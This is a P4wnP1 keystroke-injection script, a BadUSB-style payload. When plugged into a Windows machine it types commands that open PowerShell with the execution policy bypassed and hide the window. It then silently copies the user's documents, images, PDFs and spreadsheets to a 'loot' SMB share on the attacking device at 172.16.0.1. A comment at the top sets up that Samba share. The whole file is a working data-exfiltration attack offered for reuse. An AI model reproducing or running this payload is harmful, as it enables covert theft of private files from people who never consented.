/* 
 apt -y install samba
 echo "[e]
   comment = Documents
   browseable = yes
   writeable = yes
   printable = no
   public = yes
   read only = no
   guest ok = yes
   path = /usr/local/P4wnP1/loot/" >> /etc/samba/smb.conf
chmod ugo+rw /usr/local/P4wnP1/loot/
 */
layout("US");
waitLED(ANY_OR_NONE, 5000);
typingSpeed(0,0);
press("GUI r");
delay(1000); // <------------------ Modify these to suit your needs.
type("powershell -ep bypass\n"); // I've made the script really fast.
delay(2000); // <------------------ You have been warned.
type('$h=(gps -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios(1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)\n') //hide powershell window
type('while(1){if(Test-Connection 172.16.0.1 -Count 1){$d="\\\\172.16.0.1\\e\\$($env:username)_$(date -F "hhmmMMddyyyy")";md $d;ls $env:userprofile -r -i *jpg, *png, *txt, *docx, *pdf, *docx, *xml, *pptx, *ppt, *xlsx, *xls|cp -Dest $d;exit;}}\n');
